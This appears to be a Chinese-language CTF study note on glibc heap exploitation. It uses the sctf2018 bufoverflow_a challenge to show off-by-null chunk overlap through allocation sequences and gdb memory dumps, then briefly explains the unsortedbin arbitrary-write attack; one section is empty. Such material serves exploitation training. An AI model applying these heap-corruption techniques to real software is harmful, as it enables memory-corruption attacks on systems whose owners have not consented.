# The Method of Heap Use In CTF #
本篇文章的目的旨在对堆的一些使用方法和技巧进行总结，会不定期的更新。
## 1. off by null ##
以 **sctf2018 bufoverflow\_a** 题目为例，off by null的最终目的是为了完成chunk overlap，从而可以对其中的某些chunk内容进行改写。
### 利用方法1： ###
通过改写下一个chunk的size字段，从而将原空闲chunk的大小缩小。  
例如如下所示代码：
  
	Alloc(0x88)		#0
	Alloc(0x400)	#1
	Alloc(0x110)	#2
	Alloc(0x88)		#3

	Delete(0)
	Delete(1)
	Alloc(0x88)		#0
	Fill("a"*0x88)	//假设Fill函数中存在off by null漏洞，会多写一个"\x0"
此时，我们可以看看对于chunk1 的头部字段，Fill()函数执行前后的变化情况。  
	
	Fill()前
	0x0000000000000000	0x0000000000000091		<--chunk0
	......................................
	......................................
	0x0000000000000000	0x0000000000000000
	0x0000000000000000	0x0000000000000411		<--chunk1
	......................................
	......................................
	0x0000000000000410	0x0000000000000110		<--chunk2	
	
	Fill()后
	0x0000000000000000	0x0000000000000091		<--chunk0
	......................................
	......................................
	0x6161616161616161	0x6161616161616161
	0x6161616161616161	0x0000000000000400		<--chunk1
	......................................
	......................................
	0x0000000000000410	0x0000000000000110		<--chunk2		
			
可以看到，chunk1的大小减少了0x10byte。然后再次进行chunk的申请。  
	
	Alloc(0x88)		#1
	Alloc(0x88)		#4
	Alloc(0x200)	#5
	Alloc(0xc8)		#6
新申请的chunk1\_new，chunk4，chunk5，chunk6会占用之前chunk1\_old（大小为0x400）的位置。  
实际动态调试结果如下图所示：  

	0x5555557580b0:	0x6161616161616161	0x0000000000000091		<--chunk1
	0x5555557580c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
	0x5555557580d0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557580e0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557580f0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758100:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758110:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758120:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758130:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758140:	0x0000000000000090	0x0000000000000090		<--chunk4
	0x555555758150:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557581c0:	0x0000000000000000	0x0000000000000000
	0x5555557581d0:	0x0000000000000000	0x0000000000000211		<--chunk5
	0x5555557581e0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557583d0:	0x0000000000000000	0x0000000000000000
	0x5555557583e0:	0x0000000000000000	0x00000000000000d1		<--chunk6
	0x5555557583f0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557584a0:	0x0000000000000000	0x0000000000000000
	0x5555557584b0:	0x0000000000000000	0xcccccccccccccccd
	0x5555557584c0:	0x0000000000000410	0x0000000000000110		<--chunk2
	0x5555557584d0:	0x0000000000000000	0x0000000000000000

此时将chunk1\_new释放，再将chunk2释放。  

	Delete(1)
	Delete(2)
	Delete(5)
由于chunk2的presize字段的值仍为0x410，且其pre\_inuse为0（表示上一个块也处于释放状态）。释放chunk2会出发前向合并，形成一个包含chunk1，chunk4，chunk5，chunk6和chunk2的大块，如下图所示：

	gdb-peda$ x/150gx 0x5555557580c0-0x10
	0x5555557580b0:	0x6161616161616161	0x0000000000000521		<--原chunk1
	0x5555557580c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
	0x5555557580d0:	0x0000000000000000	0x0000000000000000
	0x5555557580e0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557580f0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758100:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758110:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758120:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758130:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758140:	0x0000000000000090	0x0000000000000090		<--chunk4
	0x555555758150:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557581c0:	0x0000000000000000	0x0000000000000000
	0x5555557581d0:	0x0000000000000000	0x0000000000000211		<--chunk5
	0x5555557581e0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557583d0:	0x0000000000000000	0x0000000000000000
	0x5555557583e0:	0x0000000000000000	0x00000000000000d1		<--chunk6
	0x5555557583f0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557584a0:	0x0000000000000000	0x0000000000000000
	0x5555557584b0:	0x0000000000000000	0xcccccccccccccccd
	0x5555557584c0:	0x0000000000000410	0x0000000000000110		<--原chunk2
	0x5555557584d0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557584e0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557584f0:	0xcccccccccccccccc	0xcccccccccccccccc


### 利用方法2： ###


## 2.Unsortedbin Attack ##
主要利用chunk分配过程中，如果使用unsortedbin进行分配，会有一个拆链的操作，该操作可以实现任意地址写固定值的操作。  
![vul](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack.JPG)  
其中bck为当前带切分chunk（victim）的bk值，即bck = victim->bk。因此我们在利用时，可以伪造victim的bk值，使其等于我们想要修改地址-0x10的地址（64bit，32bit在为-0x8），这样就可以改写改地址的内容为一个很大的值（unsortedbin的地址）。

以pwnable.tw的一道题目（BookWriter）为例进行讲解。  

